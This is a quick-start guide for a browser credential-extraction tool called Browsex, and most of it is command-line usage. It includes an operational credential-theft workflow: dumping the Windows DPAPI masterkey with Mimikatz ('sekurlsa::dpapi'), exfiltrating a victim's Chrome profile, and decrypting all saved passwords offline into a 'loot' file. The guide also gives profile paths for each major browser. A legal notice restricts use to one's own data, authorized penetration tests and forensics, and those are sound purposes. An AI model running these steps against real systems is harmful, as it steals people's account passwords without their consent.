# Browsex Quick Start Guide

## Installation

```bash
# Clone and setup
git clone <repository-url>
cd Browsex

# Create venv and install
uv venv
uv pip install -e ".[linux,crossplatform]"  # Linux
# OR
uv pip install -e ".[windows,crossplatform]"  # Windows
# OR
uv pip install -e ".[macos]"  # macOS
```

## Basic Usage

### ⚠️ Important: Chromium Browsers Require -k for Passwords

**Chrome, Brave, Edge, Opera** password extraction requires `-k` masterkey flag.  
**Firefox** does not require `-k` (uses NSS crypto).

### Extract Passwords

```bash
# Chrome - REQUIRES -k masterkey for passwords
browsex chrome -p ~/.config/google-chrome/Default --passwords -k <64_byte_hex_masterkey>

# Firefox - no -k needed
browsex firefox -p ~/.mozilla/firefox/xxx.default-release -m "password" --passwords
```

### Extract Bookmarks/History (No -k Needed)

```bash
# Chrome bookmarks - NO -k required
browsex chrome -p ~/.config/google-chrome/Default --bookmarks

# Chrome history - NO -k required
browsex chrome -p ~/.config/google-chrome/Default --history

# Combine bookmarks and history
browsex chrome -p /path --bookmarks --history
```

### Extract Multiple Data Types

```bash
# Passwords + Bookmarks (requires -k for Chrome)
browsex chrome -p /path --passwords --bookmarks -k <masterkey>

# Everything including passwords (requires -k)
browsex chrome -p /path --all -k <masterkey>
```

### Save to File

```bash
# Save bookmarks as JSON (no -k needed)
browsex chrome -p /path --bookmarks -f json -o bookmarks.json

# Save everything as JSON (requires -k for passwords)
browsex chrome -p /path --all -k <masterkey> -f json -o results.json

# Firefox save to CSV
browsex firefox -p /path --all -f csv -o data.csv
```

## Advanced: Cross-Platform Windows Decryption

### Scenario
You have a Windows Chrome profile, but you're on Linux/macOS.

### Steps

**1. On Windows Machine: Extract DPAPI Masterkey**

Using Mimikatz (requires Admin):
```cmd
mimikatz.exe
privilege::debug
sekurlsa::dpapi
```

Copy the 64-byte hex `MasterKey` value (128 hex characters).

**2. Exfiltrate Chrome Profile**

Copy from Windows:
```
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\
```

Required files:
- `Local State` (encrypted key)
- `Default/Login Data` (passwords database)
- `Default/Bookmarks` (optional)
- `Default/History` (optional)

**3. On Linux/macOS: Decrypt Using Masterkey**

```bash
browsex chrome -p "User Data/Default" --passwords -k <masterkey_hex>
```

Example:
```bash
browsex chrome -p ~/exfil/Chrome/Default \
  --all \
  -f json \
  -o chrome_passwords.json \
  -k 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
```

**Same masterkey works for ALL Chromium browsers** from the same Windows user:
```bash
MASTERKEY="1a2b3c4d..."

browsex chrome -p Chrome/Default --passwords -k $MASTERKEY
browsex brave -p Brave/Default --passwords -k $MASTERKEY
browsex edge -p Edge/Default --passwords -k $MASTERKEY
```

## Output Formats

### Text (Default)
```bash
browsex chrome -p /path
# Prints to terminal with headers
```

### JSON (Structured)
```bash
browsex chrome -p /path -f json -o data.json
```
```json
{
  "logins": [
    {
      "origin_url": "https://example.com",
      "username": "user@example.com",
      "password": "secret123",
      "date_created": 13324567890000000,
      "times_used": 5
    }
  ]
}
```

### CSV (Spreadsheet)
```bash
browsex chrome -p /path -f csv -o data.csv
```
Open in Excel/LibreOffice Calc.

## Common Workflows

### Pentest: Exfiltrated Windows Profile

```bash
# 1. Install cross-platform support
uv pip install -e ".[crossplatform]"

# 2. Get masterkey from Windows (mimikatz, pypykatz, etc.)
# See CROSS_PLATFORM_DPAPI.md for 7 methods

# 3. Decrypt on Linux
browsex chrome -p exfil/Chrome/Default \
  --all \
  -f json \
  -o loot.json \
  -k <masterkey> \
  -v
```

### Forensics: Extract All Browsers

```bash
#!/bin/bash
PROFILE_BASE="/path/to/user/profiles"
OUTPUT_DIR="./browser_extraction"

mkdir -p $OUTPUT_DIR

browsex chrome -p "$PROFILE_BASE/.config/google-chrome/Default" \
  --all -f json -o "$OUTPUT_DIR/chrome.json"

browsex firefox -p "$PROFILE_BASE/.mozilla/firefox/xxx.default-release" \
  --all -f json -o "$OUTPUT_DIR/firefox.json"

browsex brave -p "$PROFILE_BASE/.config/BraveSoftware/Brave-Browser/Default" \
  --all -f json -o "$OUTPUT_DIR/brave.json"
```

### Personal Use: Migrate Passwords

```bash
# Export from old browser
browsex chrome -p ~/.config/google-chrome/Default \
  --passwords -f json -o my_passwords.json

# Import into password manager (e.g., using jq to parse JSON)
```

## Troubleshooting

### Error: "secretstorage not installed"
**Solution**: Install Linux dependencies
```bash
uv pip install -e ".[linux]"
```

### Error: "dpapick3 not installed"
**Solution**: Install cross-platform support
```bash
uv pip install -e ".[crossplatform]"
```

### Error: "MAC check failed" or "Failed to decrypt DPAPI blob"
**Causes**:
1. Wrong masterkey for this profile
2. Masterkey from different Windows user
3. Incomplete masterkey (should be exactly 128 hex chars)

**Solutions**:
1. Re-extract masterkey using mimikatz
2. Try different masterkey from mimikatz output (it shows multiple)
3. Verify masterkey length: `echo -n "$MASTERKEY" | wc -c` should be 128

### Error: "database is locked"
**Solution**: Close the browser before running browsex

### Warning: "Could not find Login Data"
**Causes**:
1. Wrong profile path (pointed at User Data instead of Default)
2. Incomplete exfiltration (missing files)

**Solutions**:
1. Use correct path: `browsex chrome -p "User Data/Default"` not `User Data`
2. Ensure you have `Login Data` file in the profile directory

## Quick Reference

| Flag | Purpose | Example |
|------|---------|---------|
| `-p PATH` | Profile path | `-p ~/.config/google-chrome/Default` |
| `-f FORMAT` | Output format (text/json/csv) | `-f json` |
| `-o FILE` | Save to file | `-o output.json` |
| `-m PASS` | Firefox master password | `-m "mypassword"` |
| `-k KEY` | DPAPI masterkey (cross-platform) | `-k 1a2b3c4d...` |
| `--passwords` | Extract passwords (default) | `--passwords` |
| `--bookmarks` | Extract bookmarks | `--bookmarks` |
| `--history` | Extract history | `--history` |
| `--all` | Extract everything | `--all` |
| `-v` | Verbose logging | `-v` |

## Browser Profile Paths

### Chrome
- **Linux**: `~/.config/google-chrome/Default/`
- **Windows**: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\`
- **macOS**: `~/Library/Application Support/Google/Chrome/Default/`

### Brave
- **Linux**: `~/.config/BraveSoftware/Brave-Browser/Default/`
- **Windows**: `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\`
- **macOS**: `~/Library/Application Support/BraveSoftware/Brave-Browser/Default/`

### Edge
- **Linux**: `~/.config/microsoft-edge/Default/`
- **Windows**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\`
- **macOS**: `~/Library/Application Support/Microsoft Edge/Default/`

### Opera
- **Linux**: `~/.config/opera/`
- **Windows**: `%APPDATA%\Opera Software\Opera Stable\`
- **macOS**: `~/Library/Application Support/com.operasoftware.Opera/`

### Firefox
- **Linux**: `~/.mozilla/firefox/xxxxxxxx.default-release/`
- **Windows**: `%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default-release\`
- **macOS**: `~/Library/Application Support/Firefox/Profiles/xxxxxxxx.default-release/`

## Legal Notice

**Only use browsex for:**
- ✅ Recovering your own passwords
- ✅ Authorized penetration testing
- ✅ Forensic analysis with proper authorization

**Never use for:**
- ❌ Unauthorized access to others' credentials
- ❌ Malicious activities

Violation of computer access laws (CFAA, Computer Misuse Act, etc.) can result in criminal prosecution.

## Next Steps

- Read full documentation: [README.md](README.md)
- Cross-platform guide: [CROSS_PLATFORM_DPAPI.md](CROSS_PLATFORM_DPAPI.md)
- Linux troubleshooting: [INSTALL_LINUX.md](INSTALL_LINUX.md)
- Architecture details: [ARCHITECTURE.md](ARCHITECTURE.md)
